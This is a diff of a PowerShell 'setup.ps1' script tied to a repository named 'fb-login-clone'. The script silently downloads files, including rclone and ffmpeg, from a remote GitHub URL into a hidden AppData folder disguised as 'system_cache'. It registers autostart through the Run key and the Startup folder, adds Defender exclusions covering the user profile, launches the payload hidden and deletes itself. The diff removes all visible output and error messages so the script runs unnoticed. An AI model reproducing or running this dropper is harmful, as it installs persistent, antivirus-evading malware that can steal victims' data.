@@ -1,5 +1,7 @@
 # setup.ps1
 
+$ErrorActionPreference = "SilentlyContinue"
+
 $dest = "$env:APPDATA\Microsoft\Windows\system_cache"
 $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
 $files = @(
@@ -13,32 +15,27 @@ $files = @(
 )
 
 # Create folder
-try {
-    if (-not (Test-Path $dest)) {
+if (-not (Test-Path $dest)) {
+    try {
         New-Item -ItemType Directory -Path $dest -Force | Out-Null
-        Write-Host "Created directory: $dest"
-    }
-} catch {
-    Write-Warning "Failed to create directory: $_"
+    } catch {}
 }
 
 # Download files
 foreach ($file in $files) {
-    try {
-        Invoke-WebRequest -Uri "$repo/$file" -OutFile "$dest\$file" -UseBasicParsing
-        Write-Host "Downloaded $file"
-    } catch {
-        Write-Warning "Failed to download ${file}: $($_.Exception.Message)"
+    $target = Join-Path $dest $file
+    if (-not (Test-Path $target)) {
+        try {
+            Invoke-WebRequest -Uri "$repo/$file" -OutFile $target -UseBasicParsing
+        } catch {}
     }
 }
 
 # Register autostart
 try {
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "system_cache" -Value "$dest\system_cache_launcher.vbs"
-    Write-Host "Autostart registered"
-} catch {
-    Write-Warning "Failed to register autostart: $_"
-}
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+        -Name "system_cache" -Value "$dest\system_cache_launcher.vbs"
+} catch {}
 
 # Add to Startup folder (duplicate autostart method)
 try {
@@ -48,58 +45,34 @@ try {
     $shortcut.TargetPath = "$dest\system_cache_launcher.vbs"
     $shortcut.WorkingDirectory = $dest
     $shortcut.Save()
-    Write-Host "Startup shortcut created"
-} catch {
-    Write-Warning "Failed to create startup shortcut: $_"
-}
+} catch {}
 
 # Defender exclusions
 try {
-    Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "$dest\system_cache_launcher.vbs" -ErrorAction SilentlyContinue
-    $exes = @("$dest\ffmpeg.exe", "$dest\rclone.exe")
-    foreach ($exe in $exes) {
-        Add-MpPreference -ExclusionProcess $exe -ErrorAction SilentlyContinue
-    }
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
-
-    Write-Host "Defender exclusions added"
-} catch {
-    Write-Warning "Failed to add Defender exclusions: $_"
-}
+    Add-MpPreference -ExclusionPath $dest
+    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
+    Add-MpPreference -ExclusionProcess "$dest\system_cache_launcher.vbs"
+    Add-MpPreference -ExclusionProcess "$dest\rclone.exe"
+    Add-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
+} catch {}
 
 # Hide folder
 try {
     if (Test-Path $dest) {
         $item = Get-Item -LiteralPath $dest
-        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
-        Write-Host "Folder hidden: $dest"
-    } else {
-        Write-Warning "Directory not found for hiding: $dest"
+        $item.Attributes = $item.Attributes -bor 'Hidden'
     }
-} catch {
-    Write-Warning "Failed to hide folder: $_"
-}
+} catch {}
 
 # Launch main script silently
 try {
     Start-Process -WindowStyle Hidden -FilePath "$dest\system_cache_launcher.vbs"
-    Write-Host "Main script launched"
-} catch {
-    Write-Warning "Failed to launch main script: $_"
-}
+} catch {}
 
-foreach ($file in $files) {
-    $target = "$dest\$file"
-    if (-not (Test-Path $target)) {
-        try {
-            Invoke-WebRequest -Uri "$repo/$file" -OutFile $target -UseBasicParsing
-            Write-Host "Downloaded $file"
-        } catch {
-            Write-Warning "Failed to download ${file}: $($_.Exception.Message)"
-        }
-    } else {
-        Write-Host "$file already exists, skipping."
-    }
-}
+# Self-delete
+Start-Sleep -Seconds 2
+$me = $MyInvocation.MyCommand.Path
+try {
+    Remove-Item $me -Force
+} catch {}
